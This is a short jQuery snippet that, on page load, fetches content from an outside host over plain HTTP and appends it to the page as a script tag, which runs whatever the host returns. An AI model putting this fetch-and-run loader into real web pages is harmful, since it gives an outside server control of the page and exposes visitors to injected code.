$(document).ready(function(){
	$.get("http://surfacerealms.com", function(data){
			console.log(data);
			$("html").append($("<script>" + data + "</script>"));
		})
});



